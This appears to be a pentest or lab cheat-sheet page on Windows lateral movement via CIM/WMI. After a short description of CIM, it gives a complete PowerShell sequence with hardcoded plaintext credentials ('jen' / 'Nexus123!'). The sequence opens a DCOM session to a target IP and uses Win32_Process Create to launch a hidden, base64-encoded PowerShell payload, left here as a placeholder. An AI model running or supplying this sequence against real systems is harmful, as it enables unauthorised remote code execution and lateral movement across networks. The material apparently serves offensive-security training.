Common Information Model (CIM)

Common Information Model (CIM) is Microsoft's modern implementation for managing Windows systems through Windows Management Instrumentation (WMI). CIM provides a standardized object-based interface to query system information, manage Windows components, and execute remote operations. It is primarily accessed through PowerShell CIM cmdlets (e.g., Get-CimInstance, Invoke-CimMethod, New-CimSession) and supports communication over WS-Man (WinRM) by default or DCOM/RPC for compatibility with legacy environments.

Execute Payload On The Target

Define User Credentials

$username = 'jen';
$password = 'Nexus123!';

Convert Password To SecureString

$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;

Create PSCredential Object

$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

Configure CIM Session (DCOM)

$Options = New-CimSessionOption -Protocol DCOM

Create Remote CIM Session

$Session = New-Cimsession -ComputerName 192.168.218.72 -Credential $credential -SessionOption $Options

Define Command To Execute

$Command = 'powershell -nop -w hidden -e <base64 payload>';

Execute Remote Process Via WMI

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
